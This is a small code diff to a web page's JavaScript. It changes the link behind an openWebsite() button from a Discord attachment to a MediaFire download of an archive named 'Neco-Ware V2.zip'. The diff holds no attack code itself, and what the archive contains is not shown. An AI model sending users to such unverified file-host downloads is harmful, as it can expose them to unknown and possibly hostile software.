@@ -49,7 +49,7 @@ function createStars() {
 }
 
 function openWebsite() {
-    window.open('https://cdn.discordapp.com/attachments/1120969252334207108/1271499874424193044/message.txt?ex=66b79009&is=66b63e89&hm=9f44542c105688ff612c132398784f3ce89a08d567297e20156d782dcfa8f625&', '_blank'); // Replace with your desired URL
+    window.open('https://download1474.mediafire.com/idxitik2ws9gvee_eQmK_jEhCQ9IkxdE3QZuW16zSlnajMX3XiyvVjECU3nGTiQuoyyyXo_Qzaqq71GSYyPcHhef66Tsc34n3LReOnmqpUc9J-cDknYbILHCEfMUPcWHWP13Zq8HliYJtnLpq0Hk5KBpfIHtchHZH4bnGdiBgw6L/0m15j9dlm3cc9cf/Neco-Ware+V2.zip', '_blank'); // Replace with your desired URL
 }
 
 createStars();
